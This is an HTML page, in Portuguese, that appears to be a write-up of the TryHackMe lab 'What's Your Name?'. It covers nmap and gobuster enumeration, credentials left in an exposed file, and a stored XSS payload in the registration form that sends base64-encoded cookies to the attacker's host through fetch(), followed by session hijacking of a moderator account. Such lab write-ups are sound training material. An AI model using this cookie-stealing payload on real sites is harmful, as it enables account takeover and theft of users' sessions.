@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Relatório de Lab - Whats Your Name?</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-br from-[#0D1121] via-[#1a2238] to-[#283655] text-white font-sans min-h-screen relative">
+  <!-- Background image decorative -->
+  <div class="pointer-events-none fixed inset-0 z-0 flex justify-center items-center">
+    <img src="https://image.lexica.art/full_webp/6957307a-3542-4118-ae89-54a02851ef3d" alt="background" class="opacity-30 w-full h-auto hidden md:block" />
+  </div>
+  <div class="relative z-10 max-w-5xl mx-auto py-12 px-2 md:px-10">
+    <!-- Cabeçalho -->
+    <header class="mb-10">
+      <div class="bg-gradient-to-r from-blue-900 to-blue-600 rounded-xl shadow-lg p-8 flex flex-col items-center">
+        <h1 class="text-4xl md:text-5xl font-extrabold uppercase tracking-widest text-white drop-shadow-lg mb-2">Whats Your Name?</h1>
+        <p class="text-green-100 text-lg">Relatório de Lab <a href="https://tryhackme.com/room/whatsyourname" class="text-green-600 hover:underline" target="_blank">Whats Your Name?</a></p>
+        <p class="mt-2 text-sm text-green-50">Data: <span class="font-semibold">Maio de 2025</span></p>
+      </div>
+    </header>
+
+    <!-- Sumário -->
+    <nav class="mb-12">
+      <div class="bg-white rounded-xl shadow p-6 border-l-4 border-blue-700">
+        <h2 class="text-2xl font-bold text-blue-900 mb-4">Sumário</h2>
+        <ul class="space-y-2 text-lg list-disc list-inside">
+          <li><a href="#introducao" class="text-blue-400 hover:underline">Introdução</a></li>
+          <li><a href="#metodologia" class="text-blue-400 hover:underline">Metodologia</a></li>
+          <li><a href="#preparacao" class="text-blue-400 hover:underline">Preparação do Ambiente</a></li>
+          <li><a href="#nmap" class="text-blue-400 hover:underline">Descoberta de Serviços com Nmap</a></li>
+          <li><a href="#analise" class="text-blue-400 hover:underline">Análise da Página Web</a></li>
+          <li><a href="#gobuster" class="text-blue-400 hover:underline">Enumeração de Arquivos com Gobuster</a></li>
+          <li><a href="#login" class="text-blue-400 hover:underline">Exploração de Funcionalidade de Login</a></li>
+          <li><a href="#moderador" class="text-blue-400 hover:underline">Em busca da flag do Moderador</a></li>
+          <li><a href="#conclusao" class="text-blue-400 hover:underline">Conclusão e Aprendizados</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <!-- Seção: Introdução -->
+    <section class="mb-12" id="introducao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Introdução
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          A segurança ofensiva é uma área fundamental para a proteção de sistemas e redes, e um dos primeiros passos em qualquer processo de pentest é a <strong>enumeração de subdomínios</strong>. Este processo ajuda a mapear a superfície de ataque de um alvo, permitindo que um atacante identifique quais subdomínios e serviços estão disponíveis. Na room <strong>"What’s Your Name?"</strong>, abordamos técnicas de enumeração de subdomínios e exploração de vulnerabilidades em aplicações web.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Neste relatório, compartilho minha experiência ao resolver os desafios dessa room, detalhando os conceitos trabalhados, as ferramentas utilizadas e os passos dados para a descoberta das flags.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Ao longo do processo, a prática de técnicas de <strong>reconhecimento</strong> foi essencial, especialmente quando usamos ferramentas como o <strong>Gobuster</strong> e realizamos ataques de <strong>injeção de JavaScript</strong>.
+        </p>
+      </div>
+    </section>
+
+    <!-- Seção: Metodologia -->
+    <section class="mb-12" id="metodologia">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Metodologia
+        </h2>
+        <ul class="list-disc pl-6 text-gray-800 text-lg space-y-2">
+          <li>Configuração do ambiente: Adição do IP da máquina alvo ao arquivo <span class="font-mono bg-gray-100 px-1 rounded">/etc/hosts</span>.</li>
+          <li>Varredura inicial: Utilização do <span class="font-mono bg-gray-100 px-1 rounded">nmap</span> para identificar portas e serviços expostos.</li>
+          <li>Enumeração de diretórios e arquivos: Uso do <span class="font-mono bg-gray-100 px-1 rounded">Gobuster</span> para descobrir recursos ocultos na aplicação web.</li>
+          <li>Análise de funcionalidades: Interação com páginas de registro e login, observação de comportamentos e mensagens.</li>
+          <li>Exploração de vulnerabilidades: Testes de injeção de scripts, captura de cookies e escalonamento de privilégios.</li>
+          <li>Registro de evidências: Captura de telas e documentação detalhada de cada etapa, com legendas explicativas para facilitar a compreensão.</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Seção: Preparação do Ambiente -->
+    <section class="mb-12" id="preparacao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Preparação do Ambiente
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Antes de iniciar a exploração, é comum configurar o ambiente de teste. No caso, o primeiro passo foi adicionar o IP da máquina alvo no arquivo <span class="font-mono bg-gray-100 px-1 rounded">/etc/hosts</span> para garantir que conseguíssemos resolver o nome do host corretamente:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">MACHINE_IP worldwap.thm</pre>
+      </div>
+    </section>
+
+    <!-- Seção: Nmap -->
+    <section class="mb-12" id="nmap">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Descoberta de Serviços com Nmap
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Uma vez que o ambiente foi configurado, a próxima etapa foi realizar a enumeração de portas abertas e serviços disponíveis na máquina alvo. É uma prática comum começar um pentest com o <strong>nmap</strong>. O comando executado foi:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">nmap -sV -sC MACHINE_IP</pre>
+        <img src="../images/images-whatsYourName/image.png" alt="Nmap scan" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          A saída revelou que a porta 80 estava aberta, indicando a presença de um serviço web. A partir daqui, seguimos para a exploração dessa aplicação.
+        </p>
+        <img src="../images/images-whatsYourName/image 1.png" alt="Nmap scan 2" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Análise da Página Web -->
+    <section class="mb-12" id="analise">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Análise da Página Web
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Ao acessar a aplicação através do navegador, encontramos uma página de registro simples:
+        </p>
+        <img src="../images/images-whatsYourName/image 2.png" alt="Página de registro" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Ao preencher as informações e clicar em Register aparece um alerta “Registration successful! Please login.” Ele apresenta um subdomínio, vamos adicionar ele no /etc/hosts para poder acessar
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Após preencher o formulário de registro, o alerta “Registration successful! Please login.” informando que o cadastro foi realizado com sucesso e solicitando login.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Na nova página exibem um <strong>subdomínio</strong> (login.worldwap.thm).
+        </p>
+        <img src="../images/images-whatsYourName/image 3.png" alt="Subdomínio encontrado" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Primeiramente devemos adicionar esse subdomínio no arquivo <span class="font-mono bg-gray-100 px-1 rounded">/etc/hosts</span> para acessá-lo diretamente:
+        </p>
+        <img src="../images/images-whatsYourName/image 4.png" alt="Adicionando hosts" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Ao acessar o subdomínio, a página está em branco, mas ao visualizar o código-fonte da página, encontramos uma referência a um arquivo chamado <span class="font-mono bg-gray-100 px-1 rounded">login.php</span>:
+        </p>
+        <img src="../images/images-whatsYourName/image 5.png" alt="login.php encontrado" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Gobuster -->
+    <section class="mb-12" id="gobuster">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Enumeração de Arquivos com Gobuster
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          A próxima etapa foi realizar uma enumeração de diretórios e arquivos para tentar identificar outras páginas ou recursos disponíveis. Para isso, utilizei o <strong>Gobuster</strong>, uma ferramenta de força bruta para buscar diretórios e arquivos em servidores web. O comando executado foi:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">gobuster dir -u http://login.worldwap.thm/ -w /usr/share/wordlists/dirb/big.txt -x php,py,js -t 100</pre>
+        <img src="../images/images-whatsYourName/image 6.png" alt="Gobuster resultado" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Um <strong>arquivo</strong> <span class="font-mono bg-gray-100 px-1 rounded">.py</span> se destacou entre os resultados. Ao acessá-lo, encontramos <strong>credenciais de login</strong> para a aplicação.
+        </p>
+        <img src="../images/images-whatsYourName/image 7.png" alt="Credenciais encontradas" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Login -->
+    <section class="mb-12" id="login">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Exploração de Funcionalidade de Login
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Com as credenciais em mãos, é possivel fazer login em <span class="font-mono bg-gray-100 px-1 rounded">http://login.worldwap.thm/login.php</span>.
+        </p>
+        <img src="../images/images-whatsYourName/image 8.png" alt="Login realizado" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Ao acessar, já encontramos a flag do Administrador (a segunda flag pedida na room, mas nesse caso a ordem das flags não importa).
+        </p>
+        <img src="../images/images-whatsYourName/image 9.png" alt="Flag admin" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Moderador -->
+    <section class="mb-12" id="moderador">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-800">
+        <h2 class="text-3xl font-bold text-cyan-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-cyan-800" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Em busca da flag do Moderador
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Agora o objetivo é encontrar a <strong>flag do moderador</strong>.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Para isso, precisamos de um servidor HTTP ativo localmente usando o seguinte comando:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">python3 -m http.serve</pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Tentei explorar um possível ataque de <strong>Cross-Site Scripting (XSS)</strong>, injetando um script no campo "Email" da página de registro:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">&lt;script&gt;fetch('http://IP_DO_KALI/');&lt;/script&gt;</pre>
+        <img src="../images/images-whatsYourName/image 10.png" alt="XSS tentativa 1" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Porém, a conexão não foi estabelecida corretamente.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Então tentei novamente colocando no “Name”.
+        </p>
+        <img src="../images/images-whatsYourName/image 11.png" alt="XSS tentativa 2" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          A conexão deve ser estabelecida desse modo.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Voltando a página de registro, coloquei em ambos “Email” e “Name” o seguinte script:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">&lt;script&gt;fetch("http://IP_DO_KALI?cookie="+ btoa(document.cookie),{method: "GET"});&lt;/script&gt;</pre>
+        <img src="../images/images-whatsYourName/image 12.png" alt="Cookie exfiltrado" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Conexão permanece estabelecida e temos um cookie!
+        </p>
+        <img src="../images/images-whatsYourName/image 13.png" alt="Cookie capturado" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <h3 class="text-2xl font-bold text-cyan-900 mb-3">Decodificando o Cookie</h3>
+        <p class="text-gray-800 mb-4 text-lg">
+          Decidi usar o <strong>CyberChef</strong> para decodificar o cookie em Base64 e obtive o PHPSESSID necessário para prosseguir
+        </p>
+        <img src="../images/images-whatsYourName/image 14.png" alt="CyberChef decode" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <h3 class="text-2xl font-bold text-cyan-900 mb-3">Mudança de Sessão e Acesso ao Painel de Moderador</h3>
+        <p class="text-gray-800 mb-4 text-lg">
+          Voltando para a tela de login que somos redirecionados após o “Register”, acessei dev tools, Storage, Cookies.
+        </p>
+        <img src="../images/images-whatsYourName/image 15.png" alt="Devtools cookies" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Em seguida, alterei o Value pelo PHPSESSID do decode do CyberChef.
+        </p>
+        <img src="../images/images-whatsYourName/image 16.png" alt="Alterando cookie" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Recarregando e acessando novamente o <span class="font-mono bg-gray-100 px-1 rounded">http://worldwap.thm/public/html/</span>, dessa vez vemos o dashboard.php.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          E temos acesso de moderador!
+        </p>
+        <img src="../images/images-whatsYourName/image 17.png" alt="Painel moderador" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          E voltando ao <span class="font-mono bg-gray-100 px-1 rounded">http://login.worldwap.thm/profile.php</span> (onde encontramos a flag de Admin) podemos encontrar a flag do moderador.
+        </p>
+        <img src="../images/images-whatsYourName/image 18.png" alt="Flag moderador" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Conclusão -->
+    <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700" id="conclusao">
+      <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+        <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+        Conclusão e Aprendizados
+      </h2>
+      <ul class="list-disc pl-6 space-y-2 text-lg">
+        <li class="text-gray-800">Hierarquia de Nomes na Internet: Compreender a estrutura de nomes de domínio e como os subdomínios podem ser utilizados para mapear a superfície de ataque.</li>
+        <li class="text-gray-800">Atenção a Detalhes: A exploração de arquivos “incomuns” e análise de código-fonte foram fundamentais para descobrir credenciais e vulnerabilidades. Detalhes, como comentários em páginas e scripts invisíveis, podem revelar informações vitais.</li>
+        <li class="text-gray-800">Uso Prático de Gobuster: A ferramenta <strong>Gobuster</strong> se mostrou muito útil para descobrir diretórios e arquivos ocultos em servidores web.</li>
+        <li class="text-gray-800">Reconhecimento: A etapa de reconhecimento é crucial em qualquer pentest. Ao entender o funcionamento do sistema e suas vulnerabilidades, conseguimos explorar falhas de segurança de forma eficaz.</li>
+        <li class="text-gray-800">XSS e Injeção de Scripts: A injeção de scripts foi uma técnica importante para manipular o comportamento da aplicação e obter informações da sessão.</li>
+      </ul>
+      <p class="text-gray-800 mt-6 text-lg">
+        Essa experiência foi muito boa para aprofundar meus conhecimentos em técnicas de <strong>enumeração</strong> e exploração em ambientes web.
+      </p>
+    </div>
+
+    <!-- Botão de Voltar -->
+    <div class="text-center mt-12">
+      <a href="../index.html" class="inline-block bg-gradient-to-r from-green-500 to-green-400 text-white font-bold py-3 px-8 rounded-lg shadow hover:from-green-600 hover:to-green-500 transition text-lg">← Voltar aos Labs</a>
+    </div>
+  </div>
+</body>
+</html>
